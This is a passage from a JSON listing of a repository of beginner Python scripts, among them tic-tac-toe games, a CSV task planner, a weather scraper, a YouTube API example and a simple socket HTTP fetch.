          "content": "import datetime\nimport csv\n\ndef load_tasks(filename='tasks.csv'):\n    tasks = []\n    with open(filename, 'r', newline='') as file:\n        reader = csv.reader(file)\n        for row in reader:\n            tasks.append({'task': row[0], 'deadline': row[1], 'completed': row[2]})\n    return tasks\n\ndef save_tasks(tasks, filename='tasks.csv'):\n    with open(filename, 'w', newline='') as file:\n        writer = csv.writer(file)\n        for task in tasks:\n            writer.writerow([task['task'], task['deadline'], task['completed']])\n\ndef add_task(task, deadline):\n    tasks = load_tasks()\n    tasks.append({'task': task, 'deadline': deadline, 'completed': 'No'})\n    save_tasks(tasks)\n    print(\"Task added successfully!\")\n\ndef show_tasks():\n    tasks = load_tasks()\n    for task in tasks:\n        print(f\"Task: {task['task']}, Deadline: {task['deadline']}, Completed: {task['completed']}\")\n\n# Example usage\nadd_task('Write daily report', '2024-04-20')\nshow_tasks()\n"
        },
        {
          "name": "TaskPlanner.py",
          "type": "blob",
          "size": 0.94140625,
          "content": "import datetime\nimport csv\n\ndef load_tasks(filename='tasks.csv'):\n    tasks = []\n    with open(filename, 'r', newline='') as file:\n        reader = csv.reader(file)\n        for row in reader:\n            tasks.append({'task': row[0], 'deadline': row[1], 'completed': row[2]})\n    return tasks\n\ndef save_tasks(tasks, filename='tasks.csv'):\n    with open(filename, 'w', newline='') as file:\n        writer = csv.writer(file)\n        for task in tasks:\n            writer.writerow([task['task'], task['deadline'], task['completed']])\n\ndef add_task(task, deadline):\n    tasks = load_tasks()\n    tasks.append({'task': task, 'deadline': deadline, 'completed': 'No'})\n    save_tasks(tasks)\n    print(\"Task added successfully!\")\n\ndef show_tasks():\n    tasks = load_tasks()\n    for task in tasks:\n        print(f\"Task: {task['task']}, Deadline: {task['deadline']}, Completed: {task['completed']}\")\n\n# Example usage\nadd_task('Write daily report', '2024-04-20')\nshow_tasks()\n"
        },
        {
          "name": "Test-Case-Generator",
          "type": "tree",
          "content": null
        },
        {
          "name": "ThirdAI",
          "type": "tree",
          "content": null
        },
        {
          "name": "TicTacToe.py",
          "type": "blob",
          "size": 5.328125,
          "content": "def print_tic_tac_toe(values):\n    print(\"\\n\")\n    print(\"\\t     |     |\")\n    print(\"\\t  {}  |  {}  |  {}\".format(values[0], values[1], values[2]))\n    print('\\t_____|_____|_____')\n \n    print(\"\\t     |     |\")\n    print(\"\\t  {}  |  {}  |  {}\".format(values[3], values[4], values[5]))\n    print('\\t_____|_____|_____')\n \n    print(\"\\t     |     |\")\n \n    print(\"\\t  {}  |  {}  |  {}\".format(values[6], values[7], values[8]))\n    print(\"\\t     |     |\")\n    print(\"\\n\")\n \n \n# Function to print the score-board\ndef print_scoreboard(score_board):\n    print(\"\\t--------------------------------\")\n    print(\"\\t              SCOREBOARD       \")\n    print(\"\\t--------------------------------\")\n \n    players = list(score_board.keys())\n    print(\"\\t   \", players[0], \"\\t    \", score_board[players[0]])\n    print(\"\\t   \", players[1], \"\\t    \", score_board[players[1]])\n \n    print(\"\\t--------------------------------\\n\")\n \n# Function to check if any player has won\ndef check_win(player_pos, cur_player):\n \n    # All possible winning combinations\n    soln = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [1, 4, 7], [2, 5, 8], [3, 6, 9], [1, 5, 9], [3, 5, 7]]\n \n    # Loop to check if any winning combination is satisfied\n    for x in soln:\n        if all(y in player_pos[cur_player] for y in x):\n \n            # Return True if any winning combination satisfies\n            return True\n    # Return False if no combination is satisfied       \n    return False       \n \n# Function to check if the game is drawn\ndef check_draw(player_pos):\n    if len(player_pos['X']) + len(player_pos['O']) == 9:\n        return True\n    return False       \n \n# Function for a single game of Tic Tac Toe\ndef single_game(cur_player):\n \n    # Represents the Tic Tac Toe\n    values = [' ' for x in range(9)]\n     \n    # Stores the positions occupied by X and O\n    player_pos = {'X':[], 'O':[]}\n     \n    # Game Loop for a single game of Tic Tac Toe\n    while True:\n        print_tic_tac_toe(values)\n         \n        # Try exception block for MOVE input\n        try:\n            print(\"Player \", cur_player, \" turn. Which box? : \", end=\"\")\n            move = int(input()) \n        except ValueError:\n            print(\"Wrong Input!!! Try Again\")\n            continue\n \n        # Sanity check for MOVE inout\n        if move < 1 or move > 9:\n            print(\"Wrong Input!!! Try Again\")\n            continue\n \n        # Check if the box is not occupied already\n        if values[move-1] != ' ':\n            print(\"Place already filled. Try again!!\")\n            continue\n \n        # Update game information\n \n        # Updating grid status \n        values[move-1] = cur_player\n \n        # Updating player positions\n        player_pos[cur_player].append(move)\n \n        # Function call for checking win\n        if check_win(player_pos, cur_player):\n            print_tic_tac_toe(values)\n            print(\"Player \", cur_player, \" has won the game!!\")     \n            print(\"\\n\")\n            return cur_player\n \n        # Function call for checking draw game\n        if check_draw(player_pos):\n            print_tic_tac_toe(values)\n            print(\"Game Drawn\")\n            print(\"\\n\")\n            return 'D'\n \n        # Switch player moves\n        if cur_player == 'X':\n            cur_player = 'O'\n        else:\n            cur_player = 'X'\n \nif __name__ == \"__main__\":\n \n    print(\"Player 1\")\n    player1 = input(\"Enter the name : \")\n    print(\"\\n\")\n \n    print(\"Player 2\")\n    player2 = input(\"Enter the name : \")\n    print(\"\\n\")\n     \n    # Stores the player who chooses X and O\n    cur_player = player1\n \n    # Stores the choice of players\n    player_choice = {'X' : \"\", 'O' : \"\"}\n \n    # Stores the options\n    options = ['X', 'O']\n \n    # Stores the scoreboard\n    score_board = {player1: 0, player2: 0}\n    print_scoreboard(score_board)\n \n    # Game Loop for a series of Tic Tac Toe\n    # The loop runs until the players quit \n    while True:\n \n        # Player choice Menu\n        print(\"Turn to choose for\", cur_player)\n        print(\"Enter 1 for X\")\n        print(\"Enter 2 for O\")\n        print(\"Enter 3 to Quit\")\n \n        # Try exception for CHOICE input\n        try:\n            choice = int(input())   \n        except ValueError:\n            print(\"Wrong Input!!! Try Again\\n\")\n            continue\n \n        # Conditions for player choice  \n        if choice == 1:\n            player_choice['X'] = cur_player\n            if cur_player == player1:\n                player_choice['O'] = player2\n            else:\n                player_choice['O'] = player1\n \n        elif choice == 2:\n            player_choice['O'] = cur_player\n            if cur_player == player1:\n                player_choice['X'] = player2\n            else:\n                player_choice['X'] = player1\n         \n        elif choice == 3:\n            print(\"Final Scores\")\n            print_scoreboard(score_board)\n            break  \n \n        else:\n            print(\"Wrong Choice!!!! Try Again\\n\")\n \n        # Stores the winner in a single game of Tic Tac Toe\n        winner = single_game(options[choice-1])\n         \n        # Edits the scoreboard according to the winner\n        if winner != 'D' :\n            player_won = player_choice[winner]\n            score_board[player_won] = score_board[player_won] + 1\n \n        print_scoreboard(score_board)\n        # Switch player who chooses X or O\n        if cur_player == player1:\n            cur_player = player2\n        else:\n            cur_player = player1\n"
        },
        {
          "name": "Tic_Tac_Toe.py",
          "type": "blob",
          "size": 5.3583984375,
          "content": "import random\n\n# a python program for tic-tac-toe game\n# module intro for introduction\n# module show_board for values\n# module playgame\n\n\ndef introduction():\n    print(\"Hello this a sample tic tac toe game\")\n    print(\"It will rotate turns between players one and two\")\n    print(\"While 3,3 would be the bottom right.\")\n    print(\"Player 1 is X and Player 2 is O\")\n\n\ndef draw_board(board):\n    print(\"    |    |\")\n    print(\"  \" + board[7] + \" | \" + board[8] + \"  | \" + board[9])\n    print(\"    |    |\")\n    print(\"-------------\")\n    print(\"    |    |\")\n    print(\"  \" + board[4] + \" | \" + board[5] + \"  | \" + board[6])\n    print(\"    |    |\")\n    print(\"-------------\")\n    print(\"    |    |\")\n    print(\"  \" + board[1] + \" | \" + board[2] + \"  | \" + board[3])\n    print(\"    |    |\")\n\n\ndef input_player_letter():\n    # Lets the player type witch letter they want to be.\n    # Returns a list with the player's letter as the first item, and the computer's letter as the second.\n    letter = \"\"\n    while not (letter == \"X\" or letter == \"O\"):\n        print(\"Do you want to be X or O? \")\n        letter = input(\"> \").upper()\n\n    # the first element in the list is the player’s letter, the second is the computer's letter.\n    if letter == \"X\":\n        return [\"X\", \"O\"]\n    else:\n        return [\"O\", \"X\"]\n\n\ndef frist_player():\n    guess = random.randint(0, 1)\n    if guess == 0:\n        return \"Computer\"\n    else:\n        return \"Player\"\n\n\ndef play_again():\n    print(\"Do you want to play again? (y/n)\")\n    return input().lower().startswith(\"y\")\n\n\ndef make_move(board, letter, move):\n    board[move] = letter\n\n\ndef is_winner(bo, le):\n    # Given a board and a player’s letter, this function returns True if that player has won.\n    # We use bo instead of board and le instead of letter so we don’t have to type as much.\n    return (\n        (bo[7] == le and bo[8] == le and bo[9] == le)\n        or (bo[4] == le and bo[5] == le and bo[6] == le)\n        or (bo[1] == le and bo[2] == le and bo[3] == le)\n        or (bo[7] == le and bo[4] == le and bo[1] == le)\n        or (bo[8] == le and bo[5] == le and bo[2] == le)\n        or (bo[9] == le and bo[6] == le and bo[3] == le)\n        or (bo[7] == le and bo[5] == le and bo[3] == le)\n        or (bo[9] == le and bo[5] == le and bo[1] == le)\n    )\n\n\ndef get_board_copy(board):\n    dupe_board = []\n    for i in board:\n        dupe_board.append(i)\n    return dupe_board\n\n\ndef is_space_free(board, move):\n    return board[move] == \" \"\n\n\ndef get_player_move(board):\n    # Let the player type in their move\n    move = \" \"\n    while move not in \"1 2 3 4 5 6 7 8 9\".split() or not is_space_free(\n        board, int(move)\n    ):\n        print(\"What is your next move? (1-9)\")\n        move = input()\n    return int(move)\n\n\ndef choose_random_move_from_list(board, moveslist):\n    possible_moves = []\n    for i in moveslist:\n        if is_space_free(board, i):\n            possible_moves.append(i)\n\n    if len(possible_moves) != 0:\n        return random.choice(possible_moves)\n    else:\n        return None\n\n\ndef get_computer_move(board, computer_letter):\n    if computer_letter == \"X\":\n        player_letter = \"O\"\n    else:\n        player_letter = \"X\"\n\n    for i in range(1, 10):\n        copy = get_board_copy(board)\n        if is_space_free(copy, i):\n            make_move(copy, computer_letter, i)\n            if is_winner(copy, computer_letter):\n                return i\n\n    for i in range(1, 10):\n        copy = get_board_copy(board)\n        if is_space_free(copy, i):\n            make_move(copy, player_letter, i)\n            if is_winner(copy, player_letter):\n                return i\n\n    move = choose_random_move_from_list(board, [1, 3, 7, 9])\n    if move != None:\n        return move\n\n    if is_space_free(board, 5):\n        return 5\n\n    return choose_random_move_from_list(board, [2, 4, 6, 8])\n\n\ndef is_board_full(board):\n    for i in range(1, 10):\n        if is_space_free(board, i):\n            return False\n    return True\n\n\nprint(\"Welcome To Tic Tac Toe!\")\n\nwhile True:\n    the_board = [\" \"] * 10\n    player_letter, computer_letter = input_player_letter()\n    turn = frist_player()\n    print(\"The \" + turn + \" go frist.\")\n    game_is_playing = True\n\n    while game_is_playing:\n        if turn == \"player\":\n            # players turn\n            draw_board(the_board)\n            move = get_player_move(the_board)\n            make_move(the_board, player_letter, move)\n\n            if is_winner(the_board, player_letter):\n                draw_board(the_board)\n                print(\"Hoory! You have won the game!\")\n                game_is_playing = False\n            else:\n                if is_board_full(the_board):\n                    draw_board(the_board)\n                    print(\"The game is tie!\")\n                    break\n                else:\n                    turn = \"computer\"\n        else:\n            # Computer's turn\n            move = get_computer_move(the_board, computer_letter)\n            make_move(the_board, computer_letter, move)\n\n            if is_winner(the_board, computer_letter):\n                draw_board(the_board)\n                print(\"The computer has beaten you! You Lose.\")\n                game_is_playing = False\n            else:\n                if is_board_full(the_board):\n                    draw_board(the_board)\n                    print(\"The game is a tie!\")\n                    break\n                else:\n                    turn = \"player\"\n    if not play_again():\n        break\n"
        },
        {
          "name": "Timetable_Operations.py",
          "type": "blob",
          "size": 1.4248046875,
          "content": "##Clock in pt2thon##\n\nt1 = input(\"Init schedule : \")  # first schedule\nHH1 = int(t1[0] + t1[1])\nMM1 = int(t1[3] + t1[4])\nSS1 = int(t1[6] + t1[7])\n\nt2 = input(\"Final schedule : \")  # second schedule\nHH2 = int(t2[0] + t2[1])\nMM2 = int(t2[3] + t2[4])\nSS2 = int(t2[6] + t2[7])\n\ntt1 = (HH1 * 3600) + (MM1 * 60) + SS1  # total schedule 1\ntt2 = (HH2 * 3600) + (MM2 * 60) + SS2  # total schedule 2\ntt3 = tt2 - tt1  # difference between tt2 e tt1\n\n# Part Math\nif tt3 < 0:\n    # If the difference between tt2 e tt1 for negative :\n\n    a = 86400 - tt1  # 86400 is seconds in 1 day;\n    a2 = a + tt2  # a2 is the difference between 1 day e the <hours var>;\n    Ht = a2 // 3600  # Ht is hours calculated;\n\n    a = a2 % 3600  # Convert 'a' in seconds;\n    Mt = a // 60  # Mt is minutes calculated;\n    St = a % 60  # St is seconds calculated;\n\nelse:\n    # If the difference between tt2 e tt1 for positive :\n\n    Ht = tt3 // 3600  # Ht is hours calculated;\n    z = tt3 % 3600  # 'z' is tt3 converting in hours by seconds\n\n    Mt = z // 60  # Mt is minutes calculated;\n    St = tt3 % 60  # St is seconds calculated;\n\n# special condition below :\nif Ht < 10:\n    h = \"0\" + str(Ht)\n    Ht = h\nif Mt < 10:\n    m = \"0\" + str(Mt)\n    Mt = m\nif St < 10:\n    s = \"0\" + str(St)\n    St = s\n# add '0' to the empty spaces (caused by previous operations) in the final result!\n\nprint(\n    \"final result is :\", str(Ht) + \":\" + str(Mt) + \":\" + str(St)\n)  # final result (formatted in clock)\n"
        },
        {
          "name": "To find the largest number between 3 numbers.py",
          "type": "blob",
          "size": 0.1787109375,
          "content": "# Python program to find the largest number among the three input numbers\n\na=[]\nfor i in range(3):\n    a.append(int(input()))\nprint(\"The largest among three numbers is:\",max(a))    \n\n"
        },
        {
          "name": "To print series 1,12,123,1234......py",
          "type": "blob",
          "size": 0.7236328125,
          "content": "# master\ndef num(a):\n\n    # initialising starting number\n\n    num = 1\n\n    # outer loop to handle number of rows\n\n    for i in range(0, a):\n\n        # re assigning num\n\n        num = 1\n\n        # inner loop to handle number of columns\n\n        # values changing acc. to outer loop\n\n        for k in range(0, i + 1):\n\n            # printing number\n\n            print(num, end=\" \")\n\n            # incrementing number at each column\n\n            num = num + 1\n\n        # ending line after each row\n\n        print(\"\\r\")\n\n\n# Driver code\n\na = 5\n\nnum(a)\n# =======\n# 1-12-123-1234 Pattern up to n lines\n\nn = int(input(\"Enter number of rows: \"))\n\nfor i in range(1, n + 1):\n    for j in range(1, i + 1):\n        print(j, end=\"\")\n    print()\n\n# master\n"
        },
        {
          "name": "Translator",
          "type": "tree",
          "content": null
        },
        {
          "name": "Trending youtube videos",
          "type": "blob",
          "size": 1.4482421875,
          "content": "'''\n Python program that uses the YouTube Data API to fetch the top 10 trending YouTube videos. \nYou’ll need to have an API key from Google Cloud Platform to use the YouTube Data API.\n\nFirst, install the google-api-python-client library if you haven’t already: \npip install google-api-python-client\n\nReplace 'YOUR_API_KEY' with your actual API key. This script will fetch and print the titles, \nchannels, and view counts of the top 10 trending YouTube videos in India. \nYou can change the regionCode to any other country code if needed.\n\nThen, you can use the following code:\n\n'''\n\nfrom googleapiclient.discovery import build\n\n# Replace with your own API key\nAPI_KEY = 'YOUR_API_KEY'\nYOUTUBE_API_SERVICE_NAME = 'youtube'\nYOUTUBE_API_VERSION = 'v3'\n\ndef get_trending_videos():\n    youtube = build(YOUTUBE_API_SERVICE_NAME, YOUTUBE_API_VERSION, developerKey=API_KEY)\n    \n    # Call the API to get the top 10 trending videos\n    request = youtube.videos().list(\n        part='snippet,statistics',\n        chart='mostPopular',\n        regionCode='IN',  # Change this to your region code\n        maxResults=10\n    )\n    response = request.execute()\n    \n    # Print the video details\n    for item in response['items']:\n        title = item['snippet']['title']\n        channel = item['snippet']['channelTitle']\n        views = item['statistics']['viewCount']\n        print(f'Title: {title}\\nChannel: {channel}\\nViews: {views}\\n')\n\nif __name__ == '__main__':\n    get_trending_videos()\n"
        },
        {
          "name": "Triplets with zero sum",
          "type": "tree",
          "content": null
        },
        {
          "name": "Turn your PDFs into audio books",
          "type": "tree",
          "content": null
        },
        {
          "name": "Turtle_Star.py",
          "type": "blob",
          "size": 0.38671875,
          "content": "import turtle\n \nboard = turtle.Turtle()\n \n# first triangle for star\nboard.forward(100) # draw base\n \nboard.left(120)\nboard.forward(100)\n \nboard.left(120)\nboard.forward(100)\n \nboard.penup()\nboard.right(150)\nboard.forward(50)\n \n# second triangle for star\nboard.pendown()\nboard.right(90)\nboard.forward(100)\n \nboard.right(120)\nboard.forward(100)\n \nboard.right(120)\nboard.forward(100)\n \nturtle.done()\n"
        },
        {
          "name": "Tweet Pre-Processing.py",
          "type": "blob",
          "size": 1.7138671875,
          "content": "#!/usr/bin/env python\n# coding: utf-8\n\n# In[10]:\n\n\nimport numpy as np\nfrom nltk.corpus import twitter_samples\nimport matplotlib.pyplot as plt\nimport random\n\n\n# In[ ]:\n\n\n# analysing tweets from the corpus\n\n\n# In[14]:\n\n\npositive_tweets = twitter_samples.strings(\"positive_tweets.json\")\n\n\n# In[15]:\n\n\nnegative_tweets = twitter_samples.strings(\"negative_tweets.json\")\n\n\n# In[16]:\n\n\nall_tweets = positive_tweets + negative_tweets\n\n\n# In[17]:\n\n\n# Analysing sampels tweets\n\nprint(positive_tweets[random.randint(0, 5000)])\n\n\n# In[19]:\n\n\n\"\"\" There are 4 basic steps in pre-processing of any text \n1.Tokenizing\n2.Removing hyper links if any\n3.Converting to lower case\n4.Removing punctuations\n5.steeming of the word\"\"\"\n\n\nimport re\nimport string\n\nfrom nltk.corpus import stopwords\nfrom nltk.stem import PorterStemmer\nfrom nltk.tokenize import TweetTokenizer\n\n\n# In[20]:\n\n\n# Removing Hyper links\n\ntweet = all_tweets[1]\n\n# removing RT words in the tweet\ntweet = re.sub(r\"^RT[\\s]+\", \"\", tweet)\n# removing hyperlinks in the tweet\ntweet = re.sub(r\"https?:\\/\\/.*[\\r\\n]*\", \"\", tweet)\n# removing #symbol from the tweet\ntweet = re.sub(r\"#\", \"\", tweet)\n\nprint(tweet)\n\n\n# In[22]:\n\n\n# Tokenizing\n\ntokenizer = TweetTokenizer(preserve_case=False, strip_handles=True, reduce_len=True)\n\ntokens = tokenizer.tokenize(tweet)\n\nprint(tokens)\n\n\n# In[23]:\n\n\n# Remving stop words and punctuation marks\n\nstoper = stopwords.words(\"english\")\n\npunct = string.punctuation\n\nprint(stoper)\nprint(punct)\n\n\n# In[24]:\n\n\ncleaned = []\nfor i in tokens:\n    if i not in stoper and i not in punct:\n        cleaned.append(i)\n\n\nprint(cleaned)\n\n\n# In[25]:\n\n\n# stemming\n\nstemmer = PorterStemmer()\n\nprocessed = []\n\nfor i in cleaned:\n    st = stemmer.stem(i)\n    processed.append(st)\n\nprint(processed)\n\n\n# In[ ]:\n"
        },
        {
          "name": "Type of angles of a triangle.py",
          "type": "blob",
          "size": 1.6845703125,
          "content": "# This program will return the type of the triangle.\n# User has to enter the angles of the triangle in degrees.\ndef angle_type():\n    angles = []\n\n    myDict = {\n        \"All angles are less than 90°.\": \"Acute Angle Triangle\",\n        \"Has a right angle (90°)\": \"Right Angle Triangle\",\n        \"Has an angle more than 90°\": \"Obtuse Angle triangle\",\n    }\n\n    print(\"**************Enter the angles of your triangle to know it's type*********\")\n\n    angle1 = int(input(\"Enter angle1 : \"))\n    if angle1 < 180 and angle1 > 0:\n        angles.append(angle1)\n    else:\n        print(\"Please enter a value less than 180°\")\n        angle1 = int(input())\n        angles.append(angle1)\n\n    angle2 = int(input(\"Enter angle2 : \"))\n    if angle2 < 180 and angle2 > 0:\n        angles.append(angle2)\n    else:\n        print(\"Please enter a value less than 180°\")\n        angle2 = int(input())\n        angles.append(angle2)\n\n    angle3 = int(input(\"Enter angle3 : \"))\n    if angle3 < 180 and angle3 > 0:\n        angles.append(angle3)\n    else:\n        print(\"Please enter a value less than 180°\")\n        angle3 = int(input())\n        angles.append(angle3)\n\n    sum_of_angles = angle1 + angle2 + angle3\n    if sum_of_angles > 180 or sum_of_angles < 180:\n        print(\"It is not a triangle!Please enter valid angles.\")\n        return -1\n\n    print(\"You have entered : \" + str(angles))\n\n    if angle1 >= 90 or angle2 >= 90 or angle3 >= 90:\n        print(myDict.get(\"Has a right angle (90°)\"))\n\n    elif angle1 < 90 and angle2 < 90 and angle3 < 90:\n        print(myDict.get(\"All angles are less than 90°.\"))\n\n    elif angle1 > 90 or angle2 > 90 or angle3 > 90:\n        print(myDict.get(\"Has an angle more than 90°\"))\n\n\nangle_type()\n"
        },
        {
          "name": "Type_of_angles_of_triangle.py",
          "type": "blob",
          "size": 1.8046875,
          "content": "# This program will return the type of the triangle.\n# User has to enter the angles of the triangle in degrees.\n\n\ndef angle_type():\n    angles = []\n\n    myDict = {\n        \"All angles are less than 90°.\": \"Acute Angle Triangle\",\n        \"Has a right angle (90°)\": \"Right Angle Triangle\",\n        \"Has an angle more than 90°\": \"Obtuse Angle triangle\",\n    }\n\n    print(\"**************Enter the angles of your triangle to know it's type*********\")\n\n    # Taking Angle 1\n\n    angle1 = int(input(\"Enter angle 1 : \"))\n\n    if angle1 < 180 and angle1 > 0:\n        angles.append(angle1)\n\n    else:\n        print(\"Please enter a value less than 180°\")\n        angle1 = int(input())\n        angles.append(angle1)\n\n    # Taking Angle 2\n\n    angle2 = int(input(\"Enter angle2 : \"))\n\n    if angle2 < 180 and angle2 > 0:\n        angles.append(angle2)\n\n    else:\n        print(\"Please enter a value less than 180°\")\n        angle2 = int(input(\"Enter angle 2 :\"))\n        angles.append(angle2)\n\n    # Taking Angle 3\n\n    angle3 = int(input(\"Enter angle3 : \"))\n\n    if angle3 < 180 and angle3 > 0:\n        angles.append(angle3)\n\n    else:\n        print(\"Please enter a value less than 180°\")\n        angle3 = int(input(\"Enter angle3 : \"))\n        angles.append(angle3)\n\n    # Answer\n\n    sum_of_angles = angle1 + angle2 + angle3\n    if sum_of_angles > 180 or sum_of_angles < 180:\n        print(\"It is not a triangle!Please enter valid angles.\")\n        return -1\n\n    print(\"You have entered : \" + str(angles))\n\n    if angle1 == 90 or angle2 == 90 or angle3 == 90:\n        print(myDict.get(\"Has a right angle (90°)\"))\n\n    elif angle1 < 90 and angle2 < 90 and angle3 < 90:\n        print(myDict.get(\"All angles are less than 90°.\"))\n\n    elif angle1 > 90 or angle2 > 90 or angle3 > 90:\n        print(myDict.get(\"Has an angle more than 90°\"))\n\n\nangle_type()\n"
        },
        {
          "name": "UI-Apps",
          "type": "tree",
          "content": null
        },
        {
          "name": "Unit Digit of a raised to power b.py",
          "type": "blob",
          "size": 0.3232421875,
          "content": "def last_digit(a, b):\n    if b == 0:  # This Code assumes that 0^0 is 1\n        return 1\n    elif a % 10 in [0, 5, 6, 1]:\n        return a % 10\n    elif b % 4 == 0:\n        return ((a % 10) ** 4) % 10\n    else:\n        return ((a % 10) ** (b % 4)) % 10\n\n\n# Courtesy to https://brilliant.org/wiki/finding-the-last-digit-of-a-power/\n"
        },
        {
          "name": "Untitled.ipynb",
          "type": "blob",
          "size": 1.9833984375,
          "content": "{\n \"cells\": [\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": null,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"import cv2\\n\",\n    \"import time\\n\",\n    \"import numpy as np\\n\",\n    \"\\n\",\n    \"## Preparation for writing the ouput video\\n\",\n    \"fourcc = cv2.VideoWriter_fourcc(*'XVID')\\n\",\n    \"out = cv2.VideoWriter('output.avi',fourcc,20.0, (640,480))\\n\",\n    \"\\n\",\n    \"##reading from the webcam \\n\",\n    \"cap = cv2.VideoCapture(0)\\n\",\n    \"\\n\",\n    \"## Allow the system to sleep for 3 seconds before the webcam starts\\n\",\n    \"time.sleep(3)\\n\",\n    \"count = 0\\n\",\n    \"background = 0\\n\",\n    \"\\n\",\n    \"## Capture the background in range of 60\\n\",\n    \"for i in range(60):\\n\",\n    \"    ret,background = cap.read()\\n\",\n    \"background = np.flip(background,axis=1)\\n\",\n    \"\\n\",\n    \"\\n\",\n    \"## Read every frame from the webcam, until the camera is open\\n\",\n    \"while(cap.isOpened()):\\n\",\n    \"    ret, img = cap.read()\\n\",\n    \"    if not ret:\\n\",\n    \"        break\\n\",\n    \"    count+=1\\n\",\n    \"    img = np.flip(img,axis=1)\\n\",\n    \"    \\n\",\n    \"    ## Convert the color space from BGR to HSV\\n\",\n    \"    hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)\\n\",\n    \"\\n\",\n    \"    ## Generat masks to detect red color\\n\",\n    \"    lower_red = np.array([0,120,50])\\n\",\n    \"    upper_red = np.array([10,255,255])\\n\",\n    \"    mask1 = cv2.inRange(hsv,lower_red,upper_red)\\n\",\n    \"\\n\",\n    \"    lower_red = np.array([170,120,70])\\n\",\n    \"    upper_red = np.array([180,255,255])\\n\",\n    \"    mask2 = cv2.inRange(hsv,lower_red,upper_red)\\n\",\n    \"\\n\",\n    \"    mask1 = mask1+mask2\"\n   ]\n  }\n ],\n \"metadata\": {\n  \"kernelspec\": {\n   \"display_name\": \"Python 3\",\n   \"language\": \"python\",\n   \"name\": \"python3\"\n  },\n  \"language_info\": {\n   \"codemirror_mode\": {\n    \"name\": \"ipython\",\n    \"version\": 3\n   },\n   \"file_extension\": \".py\",\n   \"mimetype\": \"text/x-python\",\n   \"name\": \"python\",\n   \"nbconvert_exporter\": \"python\",\n   \"pygments_lexer\": \"ipython3\",\n   \"version\": \"3.8.3\"\n  }\n },\n \"nbformat\": 4,\n \"nbformat_minor\": 4\n}\n"
        },
        {
          "name": "Voice Command Calculator.py",
          "type": "blob",
          "size": 1.0048828125,
          "content": "import operator\nimport speech_recognition as s_r\nprint(\"Your speech_recognition version is: \"+s_r.__version__)\nr = s_r.Recognizer()\nmy_mic_device = s_r.Microphone(device_index=1)\nwith my_mic_device as source:\n    print(\"Say what you want to calculate, example: 3 plus 3\")\n    r.adjust_for_ambient_noise(source)\n    audio = r.listen(source)\nmy_string=r.recognize_google(audio)\nprint(my_string)\ndef get_operator_fn(op):\n    return {\n        '+' : operator.add,\n        '-' : operator.sub,\n        'x' : operator.mul,\n        'divided' :operator.__truediv__,\n        'divided by' :operator.__truediv__,\n        'divide' :operator.__truediv__,\n        'Divided' :operator.__truediv__,\n        'Divided by' :operator.__truediv__,\n        'Divide' :operator.__truediv__,\n        'Mod' : operator.mod,\n        'mod' : operator.mod,\n        '^' : operator.xor,\n        }[op]\n\ndef eval_binary_expr(op1, oper, op2):\n    op1,op2 = int(op1), int(op2)\n    return get_operator_fn(oper)(op1, op2)\n\nprint(eval_binary_expr(*(my_string.split())))\n"
        },
        {
          "name": "VoiceAssistant",
          "type": "tree",
          "content": null
        },
        {
          "name": "VoiceRepeater",
          "type": "tree",
          "content": null
        },
        {
          "name": "Weather Scrapper",
          "type": "tree",
          "content": null
        },
        {
          "name": "WeatherGUI.py",
          "type": "blob",
          "size": 2.1064453125,
          "content": "import tkinter as tk\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\n\r\nurl = \"https://weather.com/en-IN/weather/today/l/32355ced66b7ce3ab7ccafb0a4f45f12e7c915bcf8454f712efa57474ba8d6c8\"\r\n\r\nroot = tk.Tk()\r\nroot.title(\"Weather\")\r\nroot.config(bg=\"white\")\r\n\r\n\r\ndef getWeather():\r\n    page = requests.get(url)\r\n    soup = BeautifulSoup(page.content, \"html.parser\")\r\n    location = soup.find(\"h1\", class_=\"_1Ayv3\").text\r\n    temperature = soup.find(\"span\", class_=\"_3KcTQ\").text\r\n    airquality = soup.find(\"text\", class_=\"k2Z7I\").text\r\n    airqualitytitle = soup.find(\"span\", class_=\"_1VMr2\").text\r\n    sunrise = soup.find(\"div\", class_=\"_2ATeV\").text\r\n    sunset = soup.find(\"div\", class_=\"_2_gJb _2ATeV\").text\r\n    # humidity = soup.find('div',class_='_23DP5').text\r\n    wind = soup.find(\"span\", class_=\"_1Va1P undefined\").text\r\n    pressure = soup.find(\"span\", class_=\"_3olKd undefined\").text\r\n    locationlabel.config(text=(location))\r\n    templabel.config(text=temperature + \"C\")\r\n    WeatherText = (\r\n        \"Sunrise : \"\r\n        + sunrise\r\n        + \"\\n\"\r\n        + \"SunSet : \"\r\n        + sunset\r\n        + \"\\n\"\r\n        + \"Pressure : \"\r\n        + pressure\r\n        + \"\\n\"\r\n        + \"Wind : \"\r\n        + wind\r\n        + \"\\n\"\r\n    )\r\n    weatherPrediction.config(text=WeatherText)\r\n    airqualityText = airquality + \" \" * 5 + airqualitytitle + \"\\n\"\r\n    airqualitylabel.config(text=airqualityText)\r\n\r\n    weatherPrediction.after(120000, getWeather)\r\n    root.update()\r\n\r\n\r\nlocationlabel = tk.Label(root, font=(\"Calibri bold\", 20), bg=\"white\")\r\nlocationlabel.grid(row=0, column=1, sticky=\"N\", padx=20, pady=40)\r\n\r\ntemplabel = tk.Label(root, font=(\"Caliber bold\", 40), bg=\"white\")\r\ntemplabel.grid(row=0, column=0, sticky=\"W\", padx=17)\r\n\r\nweatherPrediction = tk.Label(root, font=(\"Caliber\", 15), bg=\"white\")\r\nweatherPrediction.grid(row=2, column=1, sticky=\"W\", padx=40)\r\n\r\ntk.Label(root, text=\"Air Quality\", font=(\"Calibri bold\", 20), bg=\"white\").grid(\r\n    row=1, column=2, sticky=\"W\", padx=20\r\n)\r\nairqualitylabel = tk.Label(root, font=(\"Caliber bold\", 20), bg=\"white\")\r\nairqualitylabel.grid(row=2, column=2, sticky=\"W\")\r\n\r\ngetWeather()\r\nroot.mainloop()\r\n"
        },
        {
          "name": "Web Socket.py",
          "type": "blob",
          "size": 0.365234375,
          "content": "# Program to print a data & it's Metadata of online uploaded file using \"socket\".\nimport socket\nskt_c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nskt_c.connect(('data.pr4e.org',80))\nlink='GET http://data.pr4e.org/intro-short.txt HTTP/1.0\\r\\n\\r\\n'.encode()\nskt_c.send(link)\n\nwhile True:\n\tdata=skt_c.recv(512)\n\tif len(data)<1:\n\t\tbreak\n\tprint(data.decode())\nskt_c.close()\n"
        },
        {
